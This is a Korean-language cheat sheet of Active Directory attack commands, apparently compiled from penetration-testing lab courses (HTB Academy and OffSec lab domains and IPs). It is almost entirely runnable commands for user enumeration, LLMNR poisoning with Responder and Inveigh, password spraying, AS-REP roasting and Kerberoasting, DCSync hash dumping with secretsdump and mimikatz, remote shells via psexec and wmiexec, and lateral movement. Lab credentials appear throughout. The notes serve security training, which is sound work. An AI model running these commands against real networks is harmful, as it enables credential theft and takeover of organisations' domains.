<details>
  <summary><strong>네트워크 스캔 및 호스트 탐색</strong></summary>

### FPing
> 빠른 네트워크 스캔을 위한 도구로, 활성 호스트를 신속하게 식별

```bash
# 172.16.5.0/23 네트워크 범위의 활성 호스트 탐색
fping -asgq 172.16.5.0/23

# 발견된 호스트에 대한 상세 스캔 수행
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```  
  
</details>

---
<details>
  <summary><strong>사용자 열거</strong></summary>

### Kerbrute
> Kerberos 프로토콜을 이용한 유효한 도메인 사용자 계정 열거

```bash
# 통계적으로 가능성 높은 사용자명 리스트 다운로드
git clone https://github.com/insidetrust/statistically-likely-usernames

# 유효한 AD 사용자 열거 (jsmith.txt 또는 jsmith2.txt 사용)
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

# Kerberos를 통한 사용자명 유효성 확인
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Enum4linux
> SMB/LDAP를 통한 도메인 사용자 정보 수집

```bash
# 도메인 사용자 목록 추출 및 정리
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### CrackMapExec
> 다목적 AD 공격 도구 - 사용자 열거

```bash
# SMB를 통한 사용자 열거
crackmapexec smb 172.16.5.5 --users
```

### LDAP Search
> LDAP 프로토콜을 이용한 사용자 계정 검색

```bash
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.160.122" "(objectclass=*)"

# LDAP 쿼리를 통한 사용자 계정 추출
ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

### Windapsearch
> Windows Active Directory LDAP 검색 도구

```bash
# 익명 인증을 통한 사용자 열거
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


### RPCclient
> RPC를 통한 도메인 사용자 열거

```bash
# 널 세션을 통한 RPC 연결
rpcclient -U "" -N 172.16.5.5

# 도메인 사용자 열거
rpcclient $> enumdomusers
```
  
</details>

---
<details>
  <summary><strong>네트워크 공격</strong></summary>

### Responder
> LLMNR, NBT-NS, MDNS 스푸핑을 통한 자격증명 수집 (Linux)

```bash
# Responder 실행 - 네트워크 트래픽 모니터링 및 스푸핑
sudo responder -I tun0 -v
```

### Inveigh
> LLMNR, NBT-NS, MDNS 스푸핑을 통한 자격증명 수집 (Windows/PowerShell)

```powershell
# Inveigh 실행
.\inveigh.exe

# Inveigh 콘솔에서 ESC + ENTER 입력 후 명령어 실행

# 캡처된 고유 NTLMv2 해시 확인
GET NTLMV2UNIQUE

# 캡처된 사용자명 목록 확인
GET NTLMV2USERNAMES
```
  
</details>

---
<details>
  <summary><strong>패스워드 정책 확인</strong></summary>

### CrackMapExec
> SMB를 통한 도메인 패스워드 정책 확인

```bash
# 유효한 자격증명을 이용한 패스워드 정책 조회
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### RPCclient
> RPC를 통한 도메인 및 패스워드 정보 조회

```bash
# 널 세션으로 RPC 연결
rpcclient -U "" -N 172.16.5.5

# 도메인 정보 조회
rpcclient $> querydominfo

# 패스워드 정책 정보 조회
rpcclient $> getdompwinfo
```

### Enum4linux
> 도메인 패스워드 정책 수집

```bash
# 패스워드 정책 열거
enum4linux -P 172.16.5.5

# 차세대 enum4linux를 이용한 정보 수집 및 출력 파일 생성
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

### Windows 네트워크 명령어
> 널 세션 연결 (Windows)

```powershell
# IPC$ 공유에 널 세션 연결
net use \\DC01\ipc$ "" /u:""
```

### LDAP Search (패스워드 정책)
> LDAP를 통한 패스워드 히스토리 길이 확인

```bash
# 패스워드 히스토리 설정 확인
ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Windows 로컬 명령어
> 로컬 계정 정책 확인

```powershell
# 계정 정책 정보 조회
net accounts
```

### PowerView
> PowerShell 기반 AD 열거 도구 - 도메인 정책 확인

```powershell
# PowerView 모듈 가져오기
import-module .\PowerView.ps1

# 도메인 정책 조회
Get-DomainPolicy
```
  
</details>

---
<details>
  <summary><strong>패스워드 스프레이 공격</strong></summary>

> 계정 잠금을 피하면서 여러 계정에 동일한 패스워드를 시도하는 공격

### Bash 스크립트 기반 스프레이
```bash
# RPCclient를 이용한 패스워드 스프레이 (성공한 인증만 표시)
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Kerbrute
```bash
# Kerberos 인증을 이용한 패스워드 스프레이
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### CrackMapExec
```bash
# SMB를 통한 패스워드 스프레이 (성공한 인증만 표시)
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### DomainPasswordSpray (PowerShell)
> PowerShell 기반 패스워드 스프레이 도구

```powershell
# DomainPasswordSpray 모듈 가져오기
Import-Module .\DomainPasswordSpray.ps1

# 패스워드 스프레이 수행 및 성공 결과 파일 저장
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
  
</details>

---
<details>
  <summary><strong>자격증명 열거</strong></summary>

> 유효한 자격증명을 획득한 후 도메인 정보 수집

### CrackMapExec (다양한 열거)
```bash
# 도메인 사용자 열거
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# 도메인 그룹 열거
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# 로그온된 사용자 확인
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# SMB 공유 열거
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider Plus 모듈을 이용한 공유 폴더 크롤링
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

### SMBMap
> SMB 공유 매핑 및 파일 시스템 탐색

```bash
# SMB 공유 열거
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# 특정 공유의 디렉토리 구조 탐색 (디렉토리만 표시)
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

### RPCclient (상세 사용자 정보)
```bash
# 널 세션으로 RPC 연결
rpcclient -U "" -N 172.16.5.5

# 도메인 사용자 열거
rpcclient $> enumdomusers

# 특정 사용자의 상세 정보 조회 (RID: 0x457)
rpcclient $> queryuser 0x457
```

### Impacket (원격 실행)
> PSExec 및 WMIExec를 이용한 원격 명령 실행

```bash
# PSExec를 이용한 원격 쉘 획득
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

# WMIExec를 이용한 원격 명령 실행
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

### Windapsearch (권한 있는 계정 찾기)
```bash
# Domain Admins 그룹 멤버 조회
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# 권한 있는 사용자(Privileged Users) 조회
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### BloodHound
> 그래프 기반 AD 관계 분석 도구 - Python 인제스터

```bash
# BloodHound 데이터 수집 (모든 정보)
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### Active Directory PowerShell 모듈
> Windows에서 기본 제공되는 AD 관리 모듈

```powershell
# Active Directory 모듈 가져오기
Import-Module ActiveDirectory

# 로드된 모듈 확인
Get-Module

# 도메인 정보 조회
Get-ADDomain

# SPN이 설정된 사용자 계정 찾기 (Kerberoastable 계정)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# 도메인 트러스트 관계 확인
Get-ADTrust -Filter *

# 모든 그룹 이름 조회
Get-ADGroup -Filter * | select name

# 특정 그룹 정보 조회
Get-ADGroup -Identity "Backup Operators"

# 그룹 멤버 조회
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView
> PowerShell 기반 AD 열거 및 정찰 도구

```powershell
# PowerView 모듈 가져오기
import-module powerview.ps1

# 특정 사용자의 상세 정보 조회
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Domain Admins 그룹 멤버 재귀적 조회
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# 도메인 트러스트 매핑
Get-DomainTrustMapping

# 특정 컴퓨터에 대한 관리자 접근 권한 테스트
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# SPN이 설정된 사용자 계정 찾기
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView
> PowerView의 C# 포팅 버전

```powershell
# 특정 사용자 정보 조회
.\SharpView.exe Get-DomainUser -Identity forend
```

### Snaffler
> 네트워크 공유에서 민감한 정보 자동 검색

```powershell
# 도메인 전체에서 민감한 데이터 검색
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

### SharpHound
> BloodHound 데이터 수집 도구 (Windows 네이티브)

```powershell
# 모든 AD 정보 수집 및 ZIP 파일로 저장
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

**BloodHound 유용한 쿼리:**
- `Find Computers with Unsupported Operating Systems` - 지원 종료된 OS 찾기
- `Find Computers where Domain Users are Local Admin` - Domain Users가 로컬 관리자인 컴퓨터 찾기
  
</details>

---
<details>
  <summary><strong>AS-REP Roasting</strong></summary>

- Kerberos 사전 인증(Pre-authentication)이 비활성화된 계정이 존재
- 인증 없이 암호화된 AS-REP 응답을 획득하여 오프라인에서 비밀번호를 크랙하는 공격
- 인증이 필요없기 때문에 `Kerberoasting`이전에 시도.

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete

impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
```
```powershell
.\Rubeus.exe asreproast /nowrap
```

  
</details>

---
<details>
  <summary><strong>Kerberoasting 공격</strong></summary>

> SPN이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 크래킹

### Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```bash
sudo ntpdate <ip>
```

### GetUserSPNs (Impacket)
> 리눅스에서 Kerberoasting 수행

```bash
# 특정 사용자의 TGS 티켓 요청 및 해시 저장
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

# username만 아는 상태로 시도.
impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user> -no-pass

./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

### PowerView
> PowerShell 기반 Kerberoasting

```powershell
# PowerView 모듈 가져오기
Import-Module .\PowerView.ps1

# SPN이 있는 모든 사용자의 TGS 티켓 요청 및 CSV로 저장
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Rubeus
> C# 기반 Kerberos 공격 도구

```powershell
# Kerberoasting 가능한 계정 통계 확인
.\Rubeus.exe kerberoast /stats

# admincount=1 속성을 가진 계정만 타겟팅
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# 특정 사용자 타겟팅 (TGT 위임 사용)
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
  
</details>

---
<details>
  <summary><strong>DCSync 공격</strong></summary>

> Domain Controller를 모방하여 도메인 자격증명 덤프

### Secretsdump (Impacket)
> 원격으로 도메인 자격증명 덤프

```bash
# DC로부터 모든 해시 덤프 (DCSync 권한 필요)
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

### Mimikatz
> Windows에서 DCSync 수행

```powershell
# 특정 사용자로 PowerShell 실행 (network-only 로그온)
runas /netonly /user:INLANEFREIGHT\adunn powershell

# Active Directory 모듈 가져오기
Import-Module ActiveDirectory

# 역방향 암호화가 허용된 사용자 찾기
Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} -Properties AllowReversiblePasswordEncryption | Select-Object SamAccountName, Name

# Mimikatz 실행
.\mimikatz.exe

# 디버그 권한 활성화
mimikatz # privilege::debug

# DCSync로 관리자 계정의 자격증명 덤프
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
  
</details>

---
<details>
  <summary><strong>횡적 이동 (Lateral Movement)</strong></summary>

### RDP (Remote Desktop Protocol)

**BloodHound Cypher 쿼리:**
```cypher
# RDP 접근 가능 경로 찾기
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2
```

**PowerView:**
```powershell
# PowerView 모듈 가져오기
. .\powerview.ps1

# 특정 컴퓨터의 Remote Management Users 그룹 멤버 확인
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# 모든 도메인 컴퓨터의 Remote Management Users 그룹 멤버 확인
Get-DomainComputer | ForEach-Object {Get-NetLocalGroupMember -ComputerName $_.dnshostname -GroupName "Remote Management Users"}
```

### MSSQL (Microsoft SQL Server)

**BloodHound Cypher 쿼리:**
```cypher
# SQL 관리자 권한 경로 찾기
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) 
RETURN p2
```

**PowerUpSQL:**
```powershell
# PowerUpSQL 디렉토리로 이동
cd .\PowerUpSQL\

# PowerUpSQL 모듈 가져오기
Import-Module .\PowerUpSQL.ps1

# 도메인 내 SQL 인스턴스 발견
Get-SQLInstanceDomain

# SQL 쿼리 실행 (인증된 접근)
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

**Impacket mssqlclient:**
```bash
# Windows 인증을 사용한 MSSQL 연결
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

</details>

---
<details>
  <summary><strong>BloodHound Python</strong></summary>

```bash
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.208.40
```
  
</details>
